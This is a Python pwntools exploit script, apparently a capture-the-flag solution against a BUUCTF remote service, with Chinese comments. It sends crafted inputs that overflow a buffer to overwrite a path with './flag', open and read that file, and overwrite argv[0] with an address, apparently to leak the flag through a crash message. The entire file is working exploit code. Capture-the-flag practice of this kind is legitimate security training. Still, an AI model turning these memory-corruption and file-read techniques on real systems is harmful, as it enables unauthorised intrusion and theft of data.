from pwn import *

# p = process('./pwn')
p = remote('node4.buuoj.cn', 25785)

# 修改dest的值为./flag
p.sendline(b'2')
p.sendline(b'24558')
payload = b'l' * 24008 + b'./flag\00\00' * 10
p.sendline(payload)
p.sendline(b'n')

# 打开./flag
p.sendline(b'3')
[p.sendline(b'1') for _ in range(4)]
p.sendline(b'output.txt')
p.sendline(b'2')

# 修改fd为３, buf为0x602518, size为0x64读取./flag
p.sendline(b'4')
p.sendline(b'\x7e\x33\x40\x64\x2a\x3a\x60\x25\x18\x00')

# 修改argv[0]为0x602518
p.sendline(b'5')
payload = p64(0x602518) * 36
p.sendline(payload)

p.interactive()
